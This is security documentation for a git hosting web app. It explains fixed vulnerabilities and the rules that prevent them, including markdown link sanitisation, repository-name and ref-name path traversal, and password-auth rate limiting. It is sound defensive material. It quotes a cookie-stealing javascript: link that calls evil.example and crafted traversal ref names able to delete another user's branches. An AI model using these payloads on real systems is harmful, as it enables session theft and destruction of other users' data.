# Security

This document covers the security model and specific invariants that have to
hold — most of them were established after concrete vulnerabilities were
found and fixed, so the "why" matters as much as the rule.

## Access control

See [authentication.md](./authentication.md) for the full model. The one rule
worth repeating here: `repo-access.ts` is the **only** place that computes
whether a user can read/write/moderate a repository. Any new handler that
touches repository data must call through it (`requireReadAccess`,
`requireWriteAccess`, `getRepoWithReadAccess`, etc.) rather than re-deriving
the answer — a hand-rolled check is a place a future edit can silently get the
logic wrong (e.g. forgetting the "public + anonymous = readable" case, or the
distinction between a write collaborator and the owner for owner-only
actions).

## Stored XSS in markdown rendering

`MarkdownRenderer` (`src/components/MarkdownRenderer.tsx`) renders content
that is **fully attacker-controlled**: issue bodies, PR bodies, comments, and
README files — anyone with write access to a repo (or, for a public repo,
anyone who can comment) can put arbitrary markdown in front of anyone who
views that content.

The link/image renderer used to render a raw `<a href={href}>`/`<img
src={src}>` for any href/src that didn't match a known "external" pattern and
wasn't a recognized internal repo-reference link — reachable specifically when
no `branch` context was available, which is exactly the case for issue/PR/
comment bodies (they're rendered without a `branch` prop, only with `owner`/
`name`). A comment containing `[click me](javascript:fetch('https://evil.example/steal?c='+document.cookie))`
would render as a live `javascript:` link, executing in the viewer's
authenticated session on click.

**Fix**: `isSafeHref`/`isSafeImageSrc` gate every href/src before it reaches
a real DOM attribute. The rule is an **allowlist**, not a blocklist — schemeless
(relative) hrefs are safe by construction, and an explicit scheme is only
allowed if it's `http:`, `https:`, or `mailto:` (images additionally allow
`data:image/...` specifically, since an `<img src="data:...">` can't execute
script the way an `<a href="data:text/html,...">` navigation could). Anything
else — `javascript:`, `vbscript:`, `data:text/html`, whatever comes next — is
rejected by construction rather than requiring the blocklist to be kept
up to date.

**If you touch this component**: any new place that renders a user-controlled
href/src as a real attribute must go through these same two functions. Don't
reintroduce a raw `<a href={href}>` fallback "just for this one case" without
the check — that's exactly how the original bug existed.

## Path traversal via repository name

`repositories.ts`'s `createRepository`/`updateRepository` used to validate the
repo `name` field with only `z.string().min(1).max(100)` — no character
restriction at all. That name flows, eventually, into
`getRepoPath(ownerKey, repoName)` (`git-manager-iso.ts`), which does a real
`path.join(GIT_BASE_PATH, ownerKey, repoName)` for local-disk write hydration
(see [git-storage.md](./git-storage.md)). `path.join` resolves `..`
components — a repository named `..`, or (in the non-R2 / local-disk-only
deployment mode) something like `../../../etc/cron.d/x`, could write bare-repo
files (`HEAD`, `config`, `objects/`, `refs/`) outside the intended storage
root.

**Fix, at three layers** (defense in depth — don't remove any one layer on the
assumption another covers it):

1. **Input validation** — `repositories.ts`'s `repoNameSchema` restricts names
   to `/^[a-zA-Z0-9](?:[a-zA-Z0-9._-]*[a-zA-Z0-9])?$/`: must start/end with an
   alphanumeric, no `/`/`\`, and — because it must start and end with an
   alphanumeric — can never be `.` or `..` on its own.
2. **`sanitizeStorageSegment`** (`git-storage-naming.ts`) — used everywhere a
   storage-key segment is built from a username or repo name. Replaces
   `/`/`\` and whitespace with `-`, and additionally collapses a segment that
   is *exactly* `.` or `..` to `_` (slash-replacement alone doesn't touch a
   bare `..`, since there's no slash to replace).
3. **`getRepoPath` itself** (`git-manager-iso.ts`) — re-sanitizes both
   `ownerKey` and `repoName` via `sanitizeStorageSegment`, then verifies with
   `path.resolve` that the result is actually contained under
   `GIT_BASE_PATH` before returning it, throwing rather than silently
   returning an escaped path. This exists specifically so a caller that
   forgot to pre-sanitize (or a future code path that introduces a new way to
   reach this function) can't reintroduce the vulnerability by omission.

R2 keys built from an unsanitized segment are lower-risk on their own (S3 has
no path resolution — `"repos/x/../y"` is just a literal, harmless string key,
not a traversal), but the local-disk hydration path that every write
operation goes through, R2-configured or not, is real Node.js `path.join`
against a real filesystem, and that's where this actually bites.

## Path traversal via git branch/ref names

A separate, more severe traversal bug than the repository-name one above:
**branch/ref names** — a git push's ref-update command, a branch name typed
into the web UI, a pull request's source/target branch — reached several
isomorphic-git primitives that, unlike `git.branch`/the top-level
`git.writeRef`, **never validate the ref name themselves**:
`git.commit`, `git.merge`, `git.deleteBranch`, and the top-level
`git.resolveRef`/`git.deleteRef` all resolve straight through
`fs.write`/`fs.rm(join(gitdir, ref))` (or the R2-backend equivalent) with no
jail to the current repo's own directory.

That alone would be contained if the storage layer re-verified containment
the way `getRepoPath` does for repository names (see above) — but it doesn't.
`git-r2-backend.ts`'s `readFile`/`writeFile`/`unlink` derive the target
`{ownerKey, repoName}` by calling `parseGitDir(filepath)` on the **already
`join()`-normalized** filepath isomorphic-git hands them — not from any fixed,
trusted context tied to the repository the caller thinks it's operating on.
Once a `../`-laden ref name collapses to a path like
`repos/{victim-owner}/{victim-repo}/git/refs/heads/main`, the R2 backend
reads/writes/deletes exactly that key — the *victim's* real ref file — even
though the operation started against the attacker's own repo's `gitdir`. This
was directly exploitable in production (R2 configured is the deployed
configuration, not just a local-disk-only edge case).

Two concrete ways this was reachable, both through the ordinary web UI (no
git CLI, no raw HTTP crafting needed for the second one):

1. **`git push`'s receive-pack ref-update commands** — the client-supplied
   `refName` in each `<oldOid> <newOid> <refName>` command line was passed
   straight to `git.resolveRef`/`git.deleteRef`/`git.writeRef` in
   `handleReceivePackIso`. `git.writeRef` happens to validate internally, but
   `git.deleteRef` and `git.resolveRef` don't — a ref-delete command with
   `refName: "../../victim-owner/victim-repo/git/refs/heads/main"` and
   `oldOid` set to the all-zero oid trivially passes the compare-and-swap
   check (`resolveRef` on a non-well-formed-ref path fails and is treated as
   "doesn't exist yet"), then deletes that file.
2. **Web-UI branch operations** — `files.ts`'s `uploadFile`/`deleteFile`/
   `createBranch`/`deleteBranch` and `pull-requests.ts`'s `createPullRequest`
   all accepted `branchName`/`sourceBranchName`/`targetBranchName` as a bare
   `z.string()` with no format restriction. "Delete branch" with a
   traversal name reaches `git.deleteBranch` (no CAS check needed at all,
   simpler to exploit than the push path above); a PR with a traversal
   `targetBranchName`, once merged by anyone with merge rights, reaches
   `git.merge`/`git.commit`.

**Fix**: `src/server/git-ref-name.ts` — `isSafeFullRefName` (for the
`refs/heads/…`/`refs/tags/…` shape a push's `refName` takes) and
`isSafeBranchName` (for the bare-name shape every other entry point takes,
also rejecting anything that already looks like a full ref path, which would
otherwise smuggle through unprefixed) — both built on the same character-class
rules isomorphic-git's own internal `isValidRef` uses. Applied at every layer,
matching the repository-name fix's defense-in-depth shape:

1. **Input validation** — `files.ts` and `pull-requests.ts` validate every
   branch-name-shaped field with `safeBranchNameSchema` instead of a bare
   `z.string()`.
2. **Point of use** — `git-branch-ops.ts` (`createBranch`/`deleteBranch`/
   `checkoutBranch`), `git-commit-write.ts` (`createCommit`/`deleteFile`), and
   `git-merge-iso.ts` (`analyzeMerge`/`mergeBranches`) each re-validate their
   branch-name parameters immediately before calling into isomorphic-git —
   so a future call site that reaches these functions some other way, without
   going through the zod schema, can't reintroduce the bug by omission.
3. **`git-http-iso.ts`'s receive-pack handler** validates every ref-update
   command's `refName` with `isSafeFullRefName` before it touches
   `resolveRef`/`deleteRef`/`writeRef` at all — rejecting the whole command
   with `ok: false, reason: "invalid ref name"` rather than letting any of
   those calls run.

## Git password-auth rate limiting

`authenticateWithPassword` (`git-auth.ts`) verifies username/password
credentials directly against the DB for git HTTP requests, entirely
bypassing Better Auth's own rate limiter (which only wraps requests routed
through `auth.handler`, i.e. `/api/auth/*`) — without a rate limit here, the
git HTTP endpoint is an unthrottled password-guessing oracle against any
user's account. Locks out an account/email key after 10 failed attempts
within a 5-minute window; only failed attempts count, so a legitimate client
re-authenticating many times (frequent CI fetches) never trips it.

This is backed by a `git_auth_attempts` table, not an in-process `Map` —
the git HTTP endpoint can be served by multiple concurrent (or frequently
cold-starting) Vercel serverless instances, each with its own process
memory. A per-instance in-memory counter never accumulates a shared view of
failed attempts across them, which would let the lockout be bypassed for
free just by distributing guesses across instances/restarts. The upsert that
records a failed attempt (`recordFailedPasswordAttempt`) uses a single
`INSERT ... ON CONFLICT DO UPDATE` with the window-expiry check embedded in
the `SET` clause's `CASE` expression, so two concurrent failed attempts for
the same key can't race each other into under-counting the way a
read-then-write would.

## Personal Access Tokens

PATs are stored as a SHA-256 hash (`tokens.tokenHash`), never in plaintext.
This is the correct approach specifically because PATs are high-entropy random
strings — unlike password hashing (which needs a slow, salted algorithm like
bcrypt/argon2 to resist brute-forcing low-entropy human passwords), a fast
hash is fine for a token that's already unguessable. See
[authentication.md](./authentication.md) for the full auth-fallback chain.

## Secrets

`BETTER_AUTH_SECRET` must never be reachable from client-bundled code — see
[authentication.md](./authentication.md)'s note on `auth-session.ts`'s dynamic
import. No credential (password, PAT, session cookie) is ever passed to
`console.log`/`console.error` anywhere in the auth paths — only generic
"auth failed" messages are logged.

## Dependency vulnerabilities

`pnpm audit` will show a large number of findings in this project — as of the
last audit, all of them trace through dev-only tooling (`wrangler`/`miniflare`
pulled in transitively by `@cloudflare/vite-plugin`, which per
[deployment.md](./deployment.md) is a dependency but not actually wired into
the Vite config; and `prisma`'s own dev-server tooling nested oddly under
`drizzle-orm`/`better-auth`'s dependency tree) — none reachable from the
actual deployed runtime. Re-verify this reasoning (don't just assume it still
holds) before dismissing a new audit finding the same way; check the
`findings[].paths` in `pnpm audit --json` to see whether a given advisory's
dependency chain is genuinely dev-only or has since become part of a real
runtime path.

## A known, separate issue (not a vulnerability, but worth knowing)

Blob routes for files ending in `.md` (e.g. viewing a `README.md` through the
blob viewer) currently 404 before ever reaching the app's own router — the
Vercel-dev-emulation layer appears to treat `.md` as a static-asset extension
and short-circuits the request. This looks like it would also break in a real
deployment, not just local dev. Not a security issue, but flagged here since
it was discovered during a security/performance audit and hasn't been
root-caused yet.
